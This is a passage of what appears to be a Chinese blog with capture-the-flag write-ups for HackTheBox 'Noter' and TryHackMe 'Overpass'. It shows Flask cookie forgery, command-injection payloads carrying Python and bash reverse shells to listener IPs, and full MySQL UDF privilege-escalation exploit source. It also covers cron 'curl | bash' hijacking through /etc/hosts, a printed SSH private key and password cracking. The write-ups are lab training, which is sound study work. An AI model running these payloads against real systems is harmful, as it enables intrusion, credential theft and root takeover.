Token，拿去解密\n\n![](Hackthebox-Noter/c4c10889-b04a-44b9-be62-cfb99dd2c1a9.png)\n\n# 漏洞利用\n> [https://github.com/Paradoxis/Flask-Unsign](https://github.com/Paradoxis/Flask-Unsign)\n\n既然确定是 Flask 并且有 JWT 了，那就先暴力破解 JWT Token 的密钥吧\n\n```bash\n┌──(root💀kali)-[~/Desktop/Flask-Unsign-master]\n└─# flask-unsign --unsign --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoibHVjaWZpZWwifQ.YonkHw.yXozzyS_yg75iFARMutm6Be2D64'\n[*] Session decodes to: {'logged_in': True, 'username': 'lucifiel'}\n[*] Starting brute-forcer with 8 threads..\n[+] Found secret key after 17152 attempts\nb'secret123'\n```\n接着使用我们得到的密钥 secret123 和用户名 blue 去生成一段 JWT Token 吧\n\n```bash\n┌──(root💀kali)-[~/Desktop/Flask-Unsign-master]\n└─# flask-unsign --sign --cookie \"{'logged_in': True, 'username': 'blue'}\" --secret 'secret123'\neyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yonkfg.c45FeiSpfEgpBTGIvOACAJVXKbk\n```\n接着替换我们的 JWT Token 后，刷新页面\n\n![](Hackthebox-Noter/0bc5d4c6-8e6a-46ac-828c-5ffb0f5c5836.png)\n\n我们成功进入了 blue 用户的后台\n\n![](Hackthebox-Noter/050dc532-2ff3-485e-9056-ead7138cfefe.png)\n\n我们注意到，在这篇文章里，ftp\\_admin 用户有一份笔记，大意是说我们可以访问 FTP，并且给了我们一个账号密码\n\n```bash\nusername = blue\npassword = blue@Noter!\n```\n去登陆\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ftp 10.10.11.160                                                                           \nConnected to 10.10.11.160.\n220 (vsFTPd 3.0.3)\nName (10.10.11.160:root): blue\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\n```\n成功登陆了\n\n```bash\nftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    2 1002     1002         4096 May 02 23:05 files\n-rw-r--r--    1 1002     1002        12569 Dec 24 20:59 policy.pdf\n226 Directory send OK.\nftp> get policy.pdf\nlocal: policy.pdf remote: policy.pdf\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for policy.pdf (12569 bytes).\n226 Transfer complete.\n12569 bytes received in 0.00 secs (54.9850 MB/s)\n```\n这里看到有一个名为 policy.pdf 的文件，给下载下来\n\n![](Hackthebox-Noter/6ea11c9f-40e3-40f4-854e-6d1cd51160b4.png)\n\n在创建密码的第四条提到了\n\n```bash\nDefault user-password generated by the application is in the format of \"username@site_name!\" (This applies to all your applications)\n```\n这里的意思是，默认用户密码的格式是 username@sie\\_name!\n\n按照我们当前的情况，并且管理员是 ftp\\_admin 的情况下，那就得到了一个账号密码\n\n```bash\nusername = ftp_admin\npassword = ftp_admin@Noter!\n```\n继续登陆 ftp\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ftp 10.10.11.160\nConnected to 10.10.11.160.\n220 (vsFTPd 3.0.3)\nName (10.10.11.160:root): ftp_admin\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\n```\n登陆成功\n\n```bash\nftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\n-rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip\n-rw-r--r--    1 1003     1003        26298 Dec 01 05:52 app_backup_1638395546.zip\n226 Directory send OK.\nftp> get app_backup_1635803546.zip\nlocal: app_backup_1635803546.zip remote: app_backup_1635803546.zip\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for app_backup_1635803546.zip (25559 bytes).\n226 Transfer complete.\n25559 bytes received in 0.13 secs (193.4986 kB/s)\nftp> get app_backup_1638395546.zip\nlocal: app_backup_1638395546.zip remote: app_backup_1638395546.zip\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for app_backup_1638395546.zip (26298 bytes).\n226 Transfer complete.\n26298 bytes received in 0.13 secs (193.9745 kB/s)\n```\n这里有两个 zip 文件，我们下载解压后，发现里面的结构是一样的，进行一下比较\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# diff ./1/app.py ./2/app.py   \n17,18c17,18\n< app.config['MYSQL_USER'] = 'root'\n< app.config['MYSQL_PASSWORD'] = 'Nildogg36'\n```\n我们得到了一个 mysql 的账号密码\n\n```bash\nusername = root\npassword = Nildogg36\n```\n```bash\n                        rand_int = random.randint(1,10000)\n            command = f\"node misc/md-to-pdf.js  $'{note['body']}' {rand_int}\"\n            subprocess.run(command, shell=True, executable=\"/bin/bash\")\n```\n在 app\\_backup\\_1638395546.zip 的 [app.py](http://app.py) 的第 283 行，我们看到了一个 RCE 漏洞\n\n填入我们的 Shell 语句\n\n```bash\nurl = request.form['url']\n\n            status, error = parse_url(url)\n\n            if (status is True) and (error is None):\n                try:\n                    r = pyrequest.get(url,allow_redirects=True)\n                    rand_int = random.randint(1,10000)\n                    command = f\"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}\"\n                    subprocess.run(command, shell=True, executable=\"/bin/bash\")\n```\n通过这部分代码，我们构造了一段 POC\n\n我们创建一个名为 [exploit.md](http://exploit.md) 的文件\n\n```bash\n';python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.6\",4444)); os.dup2( s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")' # '\n```\n接着使用 NC 监听一个端口\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\n```\n然后使用 python3 打开一个 http 服务\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\n然后去页面上访问一下\n\n![](Hackthebox-Noter/f7b6070e-6a2f-4877-abad-d8d819ea6510.png)\n\n![](Hackthebox-Noter/0923d419-71e3-4c98-9574-4de9e2439cb1.png)\n\n填入我们的 shell 地址，然后执行\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.6] from (UNKNOWN) [10.10.11.160] 53994\n$ python3 -c \"import pty;pty.spawn('/bin/bash')\"\npython3 -c \"import pty;pty.spawn('/bin/bash')\"\nsvc@noter:~/app/web$ whoami&&id\nwhoami&&id\nsvc\nuid=1001(svc) gid=1001(svc) groups=1001(svc)\n```\n成功拿到一个 user 权限\n\n```bash\nsvc@noter:/home$ cat /home/svc/user.txt\ncat /home/svc/user.txt\ned6e3a8ea6c35a17e3d63a425cb95c11\n```\n成功拿到一个 user 权限的 flag 文件\n\n# 权限提升\n我们之前获得过一个 mysql 的凭证，这应该是一个提示，去看看进程\n\n```bash\nsvc@noter:~/app/web$ mysql -V\nmysql -V\nmysql  Ver 15.1 Distrib 10.3.32-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2\n```\n咱们知道了 mysql 的版本，然后搜索一下 mysql udf\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# searchsploit mysql udf\n------------------------------------------------------------------------------------------------------------ ---------------------------------\n Exploit Title                                                                                              |  Path\n------------------------------------------------------------------------------------------------------------ ---------------------------------\nMySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1)                                      | linux/local/1181.c\nMySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)                                     | linux/local/1518.c\nMySQL 4/5/6 - UDF for Command Execution                                                                     | linux/local/7856.txt\n------------------------------------------------------------------------------------------------------------ ---------------------------------\nShellcodes: No Results\n```\n应该是第二个了\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# locate linux/local/1518.c\n/usr/share/exploitdb/exploits/linux/local/1518.c\n```\n把 exp 给保存到桌面\n\n```bash\n/*\n * $Id: raptor_udf2.c,v 1.1 2006/01/18 17:58:54 raptor Exp $\n *\n * raptor_udf2.c - dynamic library for do_system() MySQL UDF\n * Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>\n *\n * This is an helper dynamic library for local privilege escalation through\n * MySQL run with root privileges (very bad idea!), slightly modified to work \n * with newer versions of the open-source database. Tested on MySQL 4.1.14.\n *\n * See also: http://www.0xdeadbeef.info/exploits/raptor_udf.c\n *\n * Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes\n * for the security vulnerabilities in the handling of User Defined Functions\n * (UDFs) reported by Stefano Di Paola <stefano.dipaola@wisec.it>. For further\n * details, please refer to:\n *\n * http://dev.mysql.com/doc/refman/5.0/en/udf-security.html\n * http://www.wisec.it/vulns.php?page=4\n * http://www.wisec.it/vulns.php?page=5\n * http://www.wisec.it/vulns.php?page=6\n *\n * \"UDFs should have at least one symbol defined in addition to the xxx symbol \n * that corresponds to the main xxx() function. These auxiliary symbols \n * correspond to the xxx_init(), xxx_deinit(), xxx_reset(), xxx_clear(), and \n * xxx_add() functions\". -- User Defined Functions Security Precautions \n *\n * Usage:\n * $ id\n * uid=500(raptor) gid=500(raptor) groups=500(raptor)\n * $ gcc -g -c raptor_udf2.c\n * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc\n * $ mysql -u root -p\n * Enter password:\n * [...]\n * mysql> use mysql;\n * mysql> create table foo(line blob);\n * mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));\n * mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';\n * mysql> create function do_system returns integer soname 'raptor_udf2.so';\n * mysql> select * from mysql.func;\n * +-----------+-----+----------------+----------+\n * | name      | ret | dl             | type     |\n * +-----------+-----+----------------+----------+\n * | do_system |   2 | raptor_udf2.so | function |\n * +-----------+-----+----------------+----------+\n * mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');\n * mysql> \\! sh\n * sh-2.05b$ cat /tmp/out\n * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)\n * [...]\n *\n * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys\n *\n */\n\n#include <stdio.h>\n#include <stdlib.h>\n\nenum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};\n\ntypedef struct st_udf_args {\n    unsigned int        arg_count;    // number of arguments\n    enum Item_result    *arg_type;    // pointer to item_result\n    char             **args;        // pointer to arguments\n    unsigned long        *lengths;    // length of string args\n    char            *maybe_null;    // 1 for maybe_null args\n} UDF_ARGS;\n\ntypedef struct st_udf_init {\n    char            maybe_null;    // 1 if func can return NULL\n    unsigned int        decimals;    // for real functions\n    unsigned long         max_length;    // for string functions\n    char            *ptr;        // free ptr for func data\n    char            const_item;    // 0 if result is constant\n} UDF_INIT;\n\nint do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)\n{\n    if (args->arg_count != 1)\n        return(0);\n\n    system(args->args[0]);\n\n    return(0);\n}\n\nchar do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)\n{\n    return(0);\n}\n\n// milw0rm.com [2006-02-20]\n```\n很完善的 exp 啊，还给了教程\n\n我们把 exp 上传上去\n\n然后按照 exp 里的教程，一步步执行\n\n```bash\n$ cd /tmp\n$ gcc -g -c raptor_udf2.c\n$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o $ raptor_udf2.so raptor_udf2.o -lc\n$ mysql -u root -p # root:Nildogg36\nMariaDB [(none)]> use mysql;\nMariaDB [mysql]> create table foo(line blob);\nMariaDB [mysql]> insert into foo values(load_file('/tmp/raptor_udf2.so'));\nMariaDB [mysql]> show variables like '%plugin%';\nMariaDB [mysql]> select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';\nMariaDB [mysql]> create function do_system returns integer soname 'raptor_udf2.so';\nMariaDB [mysql]> select * from mysql.func;\nMariaDB [mysql]> select do_system('cat /root/root.txt > /tmp/flag.txt;chown svc:svc /tmp/flag.txt');\nMariaDB [mysql]> \\! sh\n$ cat /tmp/flag.txt\n```\n然后就可以得到 root 权限的 flag 文件了","tags":["Hackthebox"]},{"title":"Overpass - TryHackMe","url":"/2022/05/05/TryHackMe/TryHackMe-Overpass/","content":"\n# 靶场介绍\n\n当一群破产的计算机科学专业的学生尝试制作密码管理器时会发生什么？显然是一次*完美*的商业成功！\n\n这个盒子上隐藏着一个 TryHackMe 订阅代码。第一个找到并激活它的人将获得一个月的免费订阅！如果您已经是订阅者，为什么不将代码提供给朋友呢？\n\n更新：该代码现已声明。机器于 2020/09/25 稍作修改。这只是为了提高机器的性能。它不影响该过程。\n\n# 靶场地址\n\n[https://tryhackme.com/room/overpass](https://tryhackme.com/room/overpass)\n\n# 信息收集\n\n## Nmap\n\n```bash\n┌──(root💀lucifiel)-[~]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.29.27\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-05-05 19:44 CST\nNmap scan report for 10.10.29.27\nHost is up (0.15s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)\n|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)\n|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)\n80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)\n|_http-title: Overpass\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=5/5%OT=22%CT=1%CU=34521%PV=Y%DS=2%DC=T%G=Y%TM=6273B8D1\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(\nOS:O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11\nOS:NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(\nOS:R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=\nOS:S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 1723/tcp)\nHOP RTT       ADDRESS\n1   151.63 ms 10.18.0.1\n2   152.12 ms 10.10.29.27\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 46.80 seconds\n```\n\n## HTTP\n\n![](TryHackMe-Overpass/image.png)\n\n没什么有用的东西，去 FUZZ 一下\n\n## FUZZ\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# gobuster dir -u http://10.10.29.27/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.29.27/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2022/05/05 07:54:43 Starting gobuster in directory enumeration mode\n===============================================================\n/img                  (Status: 301) [Size: 0] [--> img/]\n/downloads            (Status: 301) [Size: 0] [--> downloads/]\n/aboutus              (Status: 301) [Size: 0] [--> aboutus/]  \n/admin                (Status: 301) [Size: 42] [--> /admin/]  \n/css                  (Status: 301) [Size: 0] [--> css/]\n```\n\n有一个 /admin 目录，进去看一下\n\n![](TryHackMe-Overpass/image1.png)\n\n一个登陆页面，使用弱口令没有进去，看一下源代码\n\n在页面 [http://10.10.29.27/login.js](http://10.10.29.27/login.js) 中找到了一句\n\n```bash\nCookies.set(\"SessionToken\",statusOrCookie)\n```\n\n同时在 [http://10.10.29.27/main.js](http://10.10.29.27/main.js) 还有一个内容\n\n```bash\nconsole.log(\"Hello, World!\")\n```\n\n这里应该是 Cookie 设置绕过\n\n# 漏洞利用\n\n按 F12 打开控制台\n\n![](TryHackMe-Overpass/image2.png)\n\n这里也确实输出了 “Hello, World”\n\n这里修改我们的 Payload\n\n```bash\nCookies.set(\"SessionToken\", \"\")\n```\n\n在控制台输入以后，刷新\n\n![](TryHackMe-Overpass/image3.png)\n\n直接绕过了登陆机制，拿到了用户 james 的 sshkey\n\n```bash\n-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337\n\nLNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN\nJHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal\n73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT\nWDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv\nBMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ\nAL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR\n3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf\nABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk\nVfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR\nOkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P\n9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze\neaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ\n4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8\nGFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn\nexxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy\nAIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk\n6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58\ndPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i\nn0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT\n8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K\n4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z\nylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS\n49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2\n+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk\n2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7\n-----END RSA PRIVATE KEY-----\n```\n\n将 sshkey 保存到 id_rsa 中，并给予权限\n\n```bash\nchmod 600 id_rsa\n```\n\n接着使用 ssh 进行登陆\n\n```bash\n┌──(root💀lucifiel)-[~/Desktop]\n└─# ssh james@10.10.84.23 -i id_rsa\nThe authenticity of host '10.10.84.23 (10.10.84.23)' can't be established.\nECDSA key fingerprint is SHA256:4P0PNh/u8bKjshfc6DBYwWnjk1Txh5laY/WbVPrCUdY.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.84.23' (ECDSA) to the list of known hosts.\nEnter passphrase for key 'id_rsa':\n```\n\n显示需要输入密码，去破解一下\n\n```bash\n┌──(root💀lucifiel)-[~/Desktop]\n└─# ssh2john id_rsa > hash\n\n┌──(root💀lucifiel)-[~/Desktop]\n└─# cat hash\nid_rsa:$sshng$1$16$9F85D92F34F42626F13A7493AB48F337$1200$2cdbb9c10041cfba4a67771ce135a5c4852e0ffa29262d435693dad3aa708871e17bc663c37feffb19e6b52dcefaa88d2479cb4bca14551e929a8b30e29a8b19c3f70302afaf30d6b70db270eee635d36ccf02e9deeb68ec435d4c86f3bc96a5ef7fde50df64605d2e6bdad90ba9b0a08da21bab1d94d2f866ab1863baebbc3c5e099264833406ce407dc0a830d658d3583cb2f2a9dc963ba03887fc42b1e8a37d06bfe74031f8a94d2478dc518167f1e16b88c3ca45173f43efb85c936d576f04c5e6af7c6e2a407a23a93f8cb8ea59c2eb84f592d2a449ef5f06feef1ca985f7a0998cd0ea378e0a17617c5ec0649900be5b2d0161649346a19f8de671ce965d4e065d6d9ac50847060aef04fff64bd488bdeb8640544615486e3daa887c51dcac264b80e6e003ada0f4c802657268a9825a8a5fea57b5fb0cd9fd4a6b3420207864e564a5ff8e8aee5bb649b8051f0016d12cbc0554f3206a1ac1a7abd17cd1024b1ced6c59973e8570bd6450f7c67ea7c3223a845e6fb25fbaccba1af66455f5b68299a402bf320d0ca752e92859ec4f7831d6892960d644492ab40fec60aea6f5bfaff61cd5198d4dfcd3e5e7913a450e4ccaa67772e3d3bc842f26af9411ebcf9149bf33ccdeb8a647012c97c187d75d43e0be6b00a55cbac745720f0ff4142e9166f35591db690b401951b2d05289bf55a103ea634cbab053e735e5617b10d6f70e6e6a754a124a53f3463cde79a3c6e4ee14f45ab465a60f90c972242cd1569e370dee0a2a4c8ee4543ec52c5c7b7156d1beb7fbc4448188ab386719e13040a58faecf7e095def2312586b295f71c3fef31b62e890a3279631b6605200a6bf7d9d915566cd5738508291c33c18585ea13e32170ad7854d5f8d08d6fdc47491b84ebfb45f579c7b2f7eb1dd9b827c17655a4b7f8763399e8c2371b6277b1c4eb8e76a75acd38eb5cec913723ad605f563cb84b4476a9040917cef352384441dd325c6bcc9d6cab326ac7421b20083d7e766e2a01943860f0398f0294750b5cd16304f52c414ab7b28a01aa206f0dc6e6b692cc1e78310a57e962fec24ea9effc0e5fa58ca35325905f793370bb7713c512ca4b1dfa41c5fdaacacf4ca81b1dd2b2e45e8611ea0a5b19b016e7c74f9b9d4c7a41c3f9678ff284d8188e0f5424bf585f94f741adcb452683223da9fc4c548bb505c98987387c81db53d229f42f3e69298fab2f175468003d295c05b1d8979d78c7104d54c270eaaabbe006ebd7e8dbb1fa17e05e2f41b32ebca93f0789429312cba472ffc86072b5b3e530fc7e405ad26c166590b376f0f98e22c3e60b66899703813bcb13d7c9f5a6e0ae05320de78347b8ffb1d160949a5cb40e29e37071ffcb5b9762a4eec39818d52ec0bc7b227cba37aeb4ffc6700e65eb3ca5aa294e823e3eca24bcd7790d4e30893b0291b178368ca6e745af1bedd491cfb6836552e9267132f5b867e9aed6b52e3d4f14e88b9dd9075e3ea2e8242f8b2f272618211b908eb52689ead701d99b605f708a68662df7a5acc7287ce1d15b6fa12f5907953b49654f198f663663785deb244d25c220083ae62db9fd0b933477b83487606515a24864e6034ba27a624d9c5a4fcc967efe3a1000a40bc304a54ceff2c647dfec54f71e128b3a1d37c15db9ac895f9ea05cd4b6e8edca6bfc53b\n```\n\n然后使用 john 进行爆破\n\n```bash\n┌──(root💀lucifiel)-[~/Desktop]\n└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash                                                                            1 ⨯\nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes\nCost 2 (iteration count) is 1 for all loaded hashes\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\njames13          (id_rsa)\n1g 0:00:00:00 DONE (2022-05-05 20:27) 12.50g/s 167200p/s 167200c/s 167200C/s lisa..honolulu\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n```\n\n这里爆破出来了密码为 james13 去就进行连接\n\n```bash\n┌──(root💀lucifiel)-[~/Desktop]\n└─# ssh james@10.10.84.23 -i id_rsa\nEnter passphrase for key 'id_rsa':\nWelcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Thu May  5 12:32:51 UTC 2022\n\n  System load:  0.09               Processes:           92\n  Usage of /:   22.3% of 18.57GB   Users logged in:     0\n  Memory usage: 12%                IP address for eth0: 10.10.84.23\n  Swap usage:   0%\n\n47 packages can be updated.\n0 updates are security updates.\n\nLast login: Sat Jun 27 04:45:40 2020 from 192.168.170.1\njames@overpass-prod:~$ whoami&&id\njames\nuid=1001(james) gid=1001(james) groups=1001(james)\n```\n\n成功拿到 user 权限\n\n```bash\njames@overpass-prod:~$ ls\ntodo.txt  user.txt\njames@overpass-prod:~$ cat user.txt\nthm{65c1aaf000506e56996822c6281e6bf7}\n```\n\n成功拿到 user 权限的 flag 文件\n\n# 权限提升\n\n```bash\njames@overpass-prod:~$ cat todo.txt\nTo Do:\n> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough\n> Write down my password somewhere on a sticky note so that I don't forget it.\n  Wait, we make a password manager. Why don't I just use that?\n> Test Overpass for macOS, it builds fine but I'm not sure it actually works\n> Ask Paradox how he got the automated build script working and where the builds go.\n  They're not updating on the website\n```\n\n这有个 todo.txt 文件作为提示，不过我英语不好，也不确定说的啥，还是先跑个 LinPeas 看看吧\n\n```bash\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash\n```\n\n这里看到一个，root 会使用 curl 向 overpass.htm/downloads/src/buildscrit.sh 请求内容，然后使用 bash 执行\n\n```bash\n╔══════════╣ Hostname, hosts and DNS\noverpass-prod\n127.0.0.1 localhost\n127.0.1.1 overpass-prod\n127.0.0.1 overpass.thm\n::1     ip6-localhost ip6-loopback\nfe00::0 ip6-localnet\nff00::0 ip6-mcastprefix\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n\nnameserver 127.0.0.53\noptions edns0\nsearch eu-west-1.compute.internal\n```\n\n然后在这里可以看到 overpass.htm 是指向的 127.0.0.1\n\n```bash\njames@overpass-prod:~$ ls -la /etc/hosts\n-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts\n```\n\n这里可以看到，我们是有权限修改 /etc/hosts 的内容的\n\n那提权思路就有了\n\n首先创建指定的目录和脚本\n\n```bash\nmkdir -p downloads/src && vim downloads/src/buildscript.sh\n```\n\n然后写入我们的 payload\n\n```bash\nbash -c 'exec bash -i &>/dev/tcp/10.18.112.117/4444 <&1'\n```\n\n接着需要两个窗口\n\n第一个窗口 使用 nc 监听一个端口\n\n```bash\nnc -nvlp 4444\n```\n\n第二个窗口 使用 python3 开启一个 http 服务\n\n```bash\npython3 -m http.server 80\n```\n\n然后去 shell 里修改 /etc/hosts 的内容\n\n```bash\n10.18.112.117 overpass.thm\n```\n\n把第三行改成这样，然后等着就行了\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# python3 -m http.server 80  \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.84.23 - - [05/May/2022 09:17:01] \"GET /downloads/src/buildscript.sh HTTP/1.1\" 200 -\n```\n\n成功下载了我们的 